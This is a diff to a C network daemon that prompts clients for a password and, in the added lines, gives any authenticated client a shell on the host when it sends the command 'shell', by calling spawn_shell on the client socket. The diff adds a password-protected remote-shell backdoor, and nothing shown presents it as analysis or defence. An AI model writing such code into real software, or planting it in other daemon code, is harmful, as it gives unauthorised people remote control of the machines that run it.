@@ -20,7 +20,7 @@ static void	handle_new_connection(t_shield *daemon, fd_set *read_fds)
 		{
 			daemon->client_fds[daemon->client_count] = client_fd;
 			daemon->client_authenticated[daemon->client_count] = 0;
-			const char *prompt = "pass: ";
+			const char *prompt = "-> pass: ";
 			send(client_fd, prompt, strlen(prompt), 0);
 			daemon->client_count++;
 		}
@@ -65,7 +65,11 @@ static void	process_client_messages(t_shield *daemon, fd_set *read_fds)
 			if (!daemon->client_authenticated[i])
 			{
 				if (verify_pass(buffer))
+				{
 					daemon->client_authenticated[i] = 1;
+					const char *prompt = "-> ";
+					send(client_fd, prompt, strlen(prompt), 0);
+				}
 				else
 				{
 					close(client_fd);
@@ -85,6 +89,16 @@ static void	process_client_messages(t_shield *daemon, fd_set *read_fds)
 				{
 					daemon->stop_flag = 1;
 					break ;
+				}
+				else if (!strcmp(buffer, "shell"))
+				{
+					spawn_shell(daemon, client_fd);
+					return ;
+				}
+				else
+				{
+					const char *prompt = "-> ";
+					send(client_fd, prompt, strlen(prompt), 0);
 				}
 			}
 		}
